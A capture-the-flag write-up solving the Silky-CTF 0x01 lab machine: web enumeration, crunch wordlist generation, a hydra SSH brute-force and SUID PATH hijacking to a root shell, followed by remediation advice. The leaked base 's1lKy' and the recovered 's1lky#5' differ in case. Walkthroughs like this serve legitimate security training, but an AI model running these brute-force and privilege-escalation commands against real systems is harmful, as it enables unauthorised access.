# Silky-CTF: 0x01 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.106 |
| **Attacker IP** | 192.168.1.x (Kali Linux) |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Goal** | root flag (`/root/flag.txt`) |
| **Source** | [HackingArticles](https://www.hackingarticles.in/silky-ctf-0x01-vulnhub-walkthrough/) |

---

## Attack Summary

Silky-CTF: 0x01 is a beginner-friendly boot-to-root machine. The attack chain starts with web enumeration that reveals partial password information stored in a JavaScript file, followed by a targeted wordlist generation and SSH brute-force. Once on the machine, a custom SUID binary uses relative paths for system commands, enabling a classic PATH hijacking privilege escalation to root.

---

## Methodology

1. Host discovery and port scan
2. Web enumeration via `robots.txt` and source inspection
3. Password wordlist generation with Crunch
4. SSH brute-force with Hydra
5. SUID binary discovery and PATH hijacking
6. Root shell and flag capture

---

## Step 1: Host Discovery

Use netdiscover to identify the target on the local network.

```bash
netdiscover
```

Once the target IP (192.168.1.106) is confirmed, run a full service scan.

```bash
nmap -A 192.168.1.106
```

**Result:** Two open ports:
- Port 22 — OpenSSH
- Port 8080 — HTTP

![Nmap scan results](images/01-nmap.png)

---

## Step 2: Web Enumeration

Browse to `http://192.168.1.106:8080`. The homepage offers no immediate hints. Check `robots.txt` next.

```
http://192.168.1.106:8080/robots.txt
```

`robots.txt` discloses a disallowed path: `/notes.txt`.

```
http://192.168.1.106:8080/notes.txt
```

The note is written in German. Translated, it reads: *"The password has been removed from this page; the last 2 characters are missing."*

Inspect the page source of the main page. A linked JavaScript file, `script.js`, contains the partial password string:

```
s1lKy
```

This is the base of the target credential — two characters are missing from the end.

![robots.txt and notes discovery](images/02-robots-notes.png)

---

## Step 3: Wordlist Generation

The note says the last two characters are missing. Use Crunch to generate all 7-character candidates where the base is `s1lKy`, the 6th character is a symbol, and the 7th is a digit:

```bash
crunch 7 7 -t s1lKy^% >> pass.txt
```

Crunch character placeholders:
- `^` — special/symbol character
- `%` — digit (0–9)

This produces a targeted wordlist covering all symbol+digit combinations for the missing suffix.

![Hydra SSH brute-force](images/03-hydra-brute.png)

---

## Step 4: SSH Brute-Force

The partial password base `s1lKy` suggests the username is `silky`. Use Hydra to brute-force SSH with the generated wordlist:

```bash
hydra -l silky -P pass.txt 192.168.1.106 ssh
```

**Credentials found:** `silky : s1lky#5`

---

## Step 5: Initial Access

Log in via SSH with the discovered credentials:

```bash
ssh silky@192.168.1.106
```

A shell as `silky` is obtained.

---

## Step 6: Privilege Escalation — SUID PATH Hijacking

Enumerate SUID binaries on the system:

```bash
find / -perm -u=s -type f 2>/dev/null
```

A non-standard SUID binary is found: `/usr/bin/sky`.

Run `strings` on it to inspect its behavior:

```bash
strings /usr/bin/sky
```

The binary calls `echo` and `whoami` using **relative paths** (not absolute paths like `/bin/whoami`). This means it resolves these commands using the `PATH` environment variable — a classic PATH hijacking opportunity.

Create a malicious `whoami` script in `/tmp`:

```bash
echo '/bin/sh' > /tmp/whoami
chmod 777 /tmp/whoami
```

Prepend `/tmp` to the `PATH` so the SUID binary finds the fake `whoami` first:

```bash
export PATH=/tmp:$PATH
```

Execute the SUID binary:

```bash
/usr/bin/sky
```

The binary runs `whoami` from `/tmp`, which spawns `/bin/sh` with the binary's owner privileges (root), yielding a root shell.

![SUID binary PATH hijacking](images/04-suid-skel.png)

---

## Step 7: Flag Capture

Confirm root access and read the flag:

```bash
id
cd /root
cat flag.txt
```

![Root flag](images/05-root-flag.png)

---

## Lessons Learned

- Sensitive partial credentials should never be stored in publicly accessible JavaScript files.
- Custom SUID binaries must use absolute paths for all system calls; relative paths allow PATH hijacking.
- Password policies should prevent easily guessable or partially guessable credentials.
- Robots.txt is a disclosure mechanism, not a security control — sensitive paths listed there become enumeration targets.

---

## Remediation

| Vulnerability | Fix |
|---|---|
| Partial credentials in `script.js` | Remove all credential hints from client-side code |
| Sensitive path in `robots.txt` | Remove internal paths from `robots.txt`; use authentication instead |
| SUID binary using relative command paths | Rewrite `/usr/bin/sky` to use absolute paths (`/bin/echo`, `/usr/bin/whoami`) |
| Weak/guessable SSH password | Enforce strong passwords; consider key-based auth only |
